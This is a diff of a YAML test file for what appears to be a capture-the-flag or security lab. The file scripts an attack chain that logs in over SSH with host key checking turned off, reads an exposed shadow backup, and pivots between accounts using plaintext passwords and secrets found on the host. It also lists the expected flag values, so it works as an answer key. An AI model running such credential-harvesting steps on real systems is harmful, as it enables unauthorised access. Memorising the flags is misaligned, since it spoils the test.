@@ -85,27 +85,27 @@ topology:
 test:
   steps:
     - name: "SSH access as operator"
-      command: "sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} 'whoami' 2>/dev/null"
+      command: "sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} 'whoami' 2>&1"
       expect: "operator"
       timeout: 15
 
     - name: "Discover exposed shadow backup"
-      command: "sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} 'cat /opt/blackrock/backups/shadow.bak | grep engineer | cut -d: -f1' 2>/dev/null"
+      command: "sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} 'cat /opt/blackrock/backups/shadow.bak | grep engineer | cut -d: -f1' 2>&1"
       expect: "engineer"
       timeout: 15
 
     - name: "Read token 1 from backup directory"
-      command: "sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} 'cat /opt/blackrock/backups/assessment_marker.txt' 2>/dev/null"
+      command: "sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} 'cat /opt/blackrock/backups/assessment_marker.txt' 2>&1"
       expect: "h4sh_r3l4y"
       timeout: 15
 
     - name: "SSH as engineer and read secrets.txt"
-      command: "sshpass -p 'security' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer@{target.target} 'cat /home/engineer/secrets.txt' 2>/dev/null"
+      command: "sshpass -p 'security' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer@{target.target} 'cat /home/engineer/secrets.txt' 2>&1"
       expect: "Bl4ckr0ck_D3v#"
       timeout: 15
 
     - name: "SSH as devops and read flag"
-      command: "sshpass -p 'Bl4ckr0ck_D3v#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null devops@{target.target} 'cat /home/devops/flag.txt' 2>/dev/null"
+      command: "sshpass -p 'Bl4ckr0ck_D3v#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null devops@{target.target} 'cat /home/devops/flag.txt' 2>&1"
       expect: "ch41n"
       timeout: 15
 
